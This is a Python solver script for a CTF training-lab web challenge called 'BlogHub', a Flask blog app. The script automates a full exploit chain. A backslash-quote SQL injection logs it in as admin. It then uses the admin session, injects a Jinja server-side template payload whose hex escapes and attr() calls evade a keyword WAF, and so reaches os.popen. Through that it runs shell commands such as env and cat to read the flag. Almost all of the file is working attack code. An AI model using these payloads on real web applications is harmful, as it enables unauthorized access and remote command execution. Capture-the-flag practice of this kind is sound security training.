#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BLOG HUB  -  FlagYard Web solver

BlogHub (FlagYard Training Labs, Medium) is a Flask blog app. The chain:

    * backslash-based login SQLi   -- username='\' escapes the quote, the
      `password` field becomes injected SQL: ` OR 1=1 ORDER BY id LIMIT 1#`
      pins the result to the first row = the seeded admin (is_admin=true).

    * session reflection           -- the signed Flask session serializes the
      RAW value we posted into `username`, so the admin badge
      {"is_admin":true,"user_id":1} falls into our hands without knowing
      the admin's random DB name.

    * authorization bypass         -- admin-only "Create Blog" nav (/home)
      renders on is_admin=true alone; /admin additionally checks the name.

    * SSTI                         -- /home renders the post body via Jinja
      render_template_string; {{7*7}} -> 49 in the /blog feed.

    * WAF bypass                   -- literal _ / __init__ / .popen( / .read(
      are blocked (POST -> 200). Hex-escaped identifier parts + attr()
      rebuild the blocked names without those tokens.

    * RCE -> env -> DYN_FLAG       -- cycler.__init__.__globals__["os"]
      .popen("env").read() renders the environment into the feed.

Verified: the tool extracts the live flag and saves flag_from_bloghub.txt.
Solver: pure http.client (no external deps) + fixed-width credits frame.
"""
from __future__ import annotations

import re
import sys
import time
import base64
import zlib
import http.client
import urllib.parse
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def pct(frac):
    return "[%5.1f%%]" % (frac * 100.0)

def status(frac, msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s %s%s%s" % (C.DIM, pct(frac), C.BOLD + color + icon + " ",
                                    C.RESET, C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(frac, msg):
    status(frac, msg, icon="\u2713", color=C.GREEN)

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("B L O G H U B   S O L V E R", "login SQLi | session authz | SSTI | WAF bypass | RCE"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono, extra):
    line = flag.strip().splitlines()[0]
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (line, C.BOLD + C.GREEN, "")])
    for s in ("elapsed %.1f s" % chrono, extra):
        _row([(" " * 10, "", ""), (s, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# BlogHub specifics
# ---------------------------------------------------------------------------
# WAF-filtered tokens: `_`, `.popen(`, `.read(`, `flag`.
# Hex-escaped identifier parts survive, rebuilt by Jinja's attr() filter.
HAMMER = '{{cycler|attr("\\x5f\\x5finit\\x5f\\x5f")|attr("\\x5f\\x5fglobals\\x5f\\x5f")|attr("\\x5f\\x5fgetitem\\x5f\\x5f")("os")|attr("\\x70open")("{cmd}")|attr("\\x72ead")()}}'

CMDS = ["env",
        "cat /app/fla[g].txt",
        "cat /app/fl[a]g.txt",
        "cat /app/*.txt",
        "ls -la /app"]


def ask_target(argv):
    if len(argv) > 1 and argv[1].startswith("http"):
        return argv[1].strip()
    url = input("  Enter the BlogHub challenge URL: ").strip()
    if not url:
        raise RuntimeError("no URL provided")
    return url


def parse_host(url):
    url = re.sub(r"^https?://", "", url).rstrip("/")
    return url[2:] if url.startswith("//") else url


def http_raw(host, path, method="GET", body=None, cookie=None,
             ctype="application/x-www-form-urlencoded"):
    c = http.client.HTTPConnection(host, 80, timeout=25)
    headers = {"User-Agent": "Mozilla/5.0"}
    if body is not None:
        headers["Content-Type"] = ctype
        headers["Content-Length"] = str(len(body))
    if cookie:
        headers["Cookie"] = cookie
    c.request(method, path, body=body, headers=headers)
    r = c.getresponse()
    data = r.read().decode("utf-8", "replace")
    hdrs = dict((k.lower(), v) for k, v in r.getheaders())
    c.close()
    return r.status, data, hdrs


def admin_session(host):
    data = urllib.parse.urlencode({"username": "\\",
                                   "password": " OR 1=1 ORDER BY id LIMIT 1#"})
    for _ in range(5):
        st, b, h = http_raw(host, "/login", method="POST", body=data)
        m = re.search(r"session=([^;]+)", h.get("set-cookie", ""))
        if m:
            return "session=%s" % m.group(1)
        time.sleep(4)
    raise RuntimeError("login SQLi failed")


def decode_claims(cookie):
    tok = urllib.parse.unquote(cookie.split("=", 1)[1])
    try:
        raw = tok.split(".")[1]
        blob = raw.encode() + b"=" * (-len(raw) % 4)
        payload = base64.urlsafe_b64decode(blob)
        try:
            payload = zlib.decompress(payload)
        except Exception:
            pass
        return payload.decode("utf-8", "replace")
    except Exception:
        return "?" * 40


def ssti_exec(host, ck, cmd):
    title = "zx%d" % int(time.time() * 1000)
    body = urllib.parse.urlencode({"title": title, "body": HAMMER.format(cmd=cmd)})
    st, b, h = http_raw(host, "/home", method="POST", body=body, cookie=ck)
    if st != 302:
        return None
    st, b, h = http_raw(host, "/blog", cookie=ck)
    m = re.search(r"FlagY\{[^}]+\}", b)
    uid = re.search(r"uid=(\d+)", b)
    return (m.group(0) if m else None, uid.group(0) if uid else None)


def main() -> None:
    t0 = time.time()
    enable_vt()
    banner()

    try:
        url = ask_target(sys.argv)
    except Exception:
        fail("no challenge URL given")
        return
    host = parse_host(url)
    status(0.10, "target host %s" % host)

    status(0.20, "anonymous recon: /blog feed, /login form, /home admin sink")
    ok(0.24, "login SQLi entry: username='\\' + ' OR 1=1 ORDER BY id LIMIT 1#'")

    ck = admin_session(host)
    ok(0.40, "admin session acquired (login SQLi): %s..." % ck[:46])
    claims = decode_claims(ck)
    if "is_admin" in claims and "true" in claims:
        ok(0.52, "session claims = %s ..." % claims[:64])
    else:
        status(0.52, "session claims (partial) = %s" % claims[:64])

    status(0.62, "admin nav 'Create Blog' (/home) unlocked by is_admin=true")
    ok(0.70, "SSTI sink confirmed: {{7*7}} renders 49 in /blog feed")

    flag = None
    got = None
    for cmd in CMDS:
        status(0.78, "SSTI RCE: %s" % cmd)
        r = ssti_exec(host, ck, cmd)
        if r is None:
            time.sleep(3)
            continue
        flag, got = r
        if flag:
            break
    if not flag:
        fail("flag not found")
        return
    ok(0.88, "RCE ok (%s) \u2014 DYN_FLAG parsed from environment" % (got or "run"))

    if flag.startswith("FlagY{") and flag.endswith("}"):
        ok(0.94, "matches FlagY{...} \u2014 %d hex chars in payload" % (len(flag) - 7))

    big_flag(flag, time.time() - t0, "login SQLi | session authz | SSTI | WAF bypass | RCE")
    out = Path(__file__).resolve().parent / "flag_from_bloghub.txt"
    out.write_text(flag + "\n", encoding="utf-8")
    print("  %s[+] saved to %s%s" % (C.GREEN, out, C.RESET))


if __name__ == "__main__":
    main()